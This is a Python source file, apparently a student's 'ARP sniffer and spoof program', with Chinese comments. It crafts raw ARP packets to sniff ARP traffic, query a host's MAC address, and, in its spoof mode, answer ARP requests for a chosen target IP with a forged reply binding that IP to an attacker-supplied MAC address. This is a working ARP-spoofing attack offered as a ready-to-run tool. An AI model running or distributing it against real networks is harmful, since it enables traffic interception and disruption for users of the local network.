import socket as se
import struct
import uuid
import sys
import os
import binascii

def receive(Socket):
    packet = getPacketInfo()

    frame = Socket.recvfrom(2048)
    header = frame[0][0:14]
    arp_body = frame[0][14:42]

    arp_body_temp = struct.unpack("!2s2s1s1s2s6s4s6s4s", arp_body)
    header_temp = struct.unpack("!6s6s2s", header)

    packet['frame_type'] = header_temp[2]
    packet['target_mac_addr'] = binascii.hexlify(header_temp[0],':')
    packet['source_mac_addr'] = binascii.hexlify(header_temp[1],':')
    packet['opcode'] = arp_body_temp[4]
    packet['source_mac'] = binascii.hexlify(arp_body_temp[5],':')
    packet['source_ip'] = se.inet_ntoa(arp_body_temp[6])
    packet['target_mac'] = binascii.hexlify(arp_body_temp[7],':')
    packet['target_ip'] = se.inet_ntoa(arp_body_temp[8])

    return packet

def getMac():
    List = []
    Mac = uuid.getnode()
    for i in range(6):
        List = [Mac % 0x100] + List
        Mac //= 0x100
    return List

def getSocketInfo():

    #建立 socket 並且接收所有型態封包
    socket = se.socket(se.AF_PACKET, se.SOCK_RAW, se.htons(0x0003))

    socket.setsockopt(se.SOL_SOCKET, se.SO_REUSEADDR, 1)
    socket.setsockopt(se.SOL_SOCKET, se.SO_BROADCAST, 1)

    socket.bind((os.listdir('/sys/class/net/')[1], 0))

    return socket

def getPacketInfo():
    packet = {

        #ARP 標頭
        'target_mac_addr' : struct.pack('!6B',0xFF,0xFF,0xFF,0xFF,0xFF,0xFF),
        'source_mac_addr' : struct.pack('!6B',*getMac()),
        'frame_type' : struct.pack('!H',0x0806),

        #ARP 本體
        'hw_type' : struct.pack('!H', 0x0001),
        'protocal_type' : struct.pack('!H', 0x0800),
        'hw_length' : struct.pack('!B', 0x06),
        'protocal_length' : struct.pack('!B', 0x04),
        'opcode' : struct.pack('!H', 0x0001),
        'source_mac' : struct.pack('!6B',*getMac()),
        'source_ip' : se.inet_aton(se.gethostbyname(se.gethostname())),
        'target_mac' : struct.pack('!6B',0,0,0,0,0,0),
        'target_ip' : ''
    }
    return packet


def listening(ip=""):
    print("### ARP sniffer mode ###")
    
    while True:
        arp_packet = receive(getSocketInfo())
      
        if arp_packet['frame_type'] != b'\x08\x06':
            continue

        #如有指定IP則過濾
        if ip!="" and arp_packet['target_ip'] != ip and arp_packet['source_ip'] != ip:
            continue

        print("Get ARP packet - Who has " + arp_packet['target_ip'] + " ?      Tell " + arp_packet['source_ip'])

def question(ip):
    print("### ARP query mode ###")

    arp_packet = getPacketInfo()
    arp_socket = getSocketInfo()

    arp_packet['target_ip'] = se.inet_aton(ip)

    arp_packet_list = [ i for i in arp_packet.values() ]


    
    arp_packet['source_ip'] = se.inet_ntoa(arp_packet['source_ip'])
    arp_packet['target_ip'] = se.inet_ntoa(arp_packet['target_ip'])
  
    arp_socket.send(b''.join(arp_packet_list))

    while True:
        arp_responce = receive(arp_socket)

        if arp_responce['frame_type'] != b'\x08\x06':
           continue
        
        if arp_responce['source_ip'] == ip:
            print("MAC address of " + arp_responce['source_ip'] + " is " + bytes.decode(arp_responce['source_mac']))
            break

def spoof(fack_mac , target_ip):
    Socket = getSocketInfo()

    fack_mac = str.encode(fack_mac)
    fack_mac = binascii.unhexlify(fack_mac.replace(b':', b''))
    while True:
        arp_request = receive(Socket)

        if arp_request['frame_type'] != b'\x08\x06':
            continue

        if arp_request['opcode'] != b'\x00\x01' or arp_request['target_ip'] != target_ip:
            continue
            print("arp request")
 
        print("Arp request target ip is " + arp_request['target_ip'])

        print("fack arp responce :")

        fack_arp_responce = getPacketInfo()
        
        arp_request['source_mac'] = bytes.decode(arp_request['source_mac'])
        arp_request['source_mac'] = arp_request['source_mac'].replace(':','')

        fack_arp_responce['target_mac_addr'] = binascii.unhexlify(arp_request['source_mac'])
        fack_arp_responce['source_mac_addr'] = fack_mac
        fack_arp_responce['opcode'] = struct.pack('!H', 0x0002)
        fack_arp_responce['source_mac'] = fack_mac
        fack_arp_responce['target_ip'] = se.inet_aton(arp_request['source_ip'])
        fack_arp_responce['source_ip'] = se.inet_aton(target_ip)
        fack_arp_responce['target_mac'] = binascii.unhexlify(arp_request['source_mac'])
        
        
        fack_arp_responce_list = [ k for k in fack_arp_responce.values() ]

        Socket.send(b''.join(fack_arp_responce_list))
        print("Send successfull.")
        exit()



def main(run):
    if os.geteuid() != 0:
        print("ERROR: You must be root to use the tool!")
        exit()

    print("[ ARP sniffer and spoof program ]")

    if run[0] == '-help':
        print("Format :\n"+"1) arp.py -l -a\n"+
            "2) arp.py -l <filter_ip_address>\n"+
            "3) arp.py -q <query_ip_address>\n"+
            "4) arp.py <fack_mac_address> <target_ip_address>\n")

    elif run[0] == '-l':
        if run[1] == '-a':
            listening()
        else:
            listening(run[1])

    elif run[0] == '-q':
        question(run[1])

    else:
        spoof(run[0],run[1])
    
if __name__ == '__main__':
    main(sys.argv[1:])

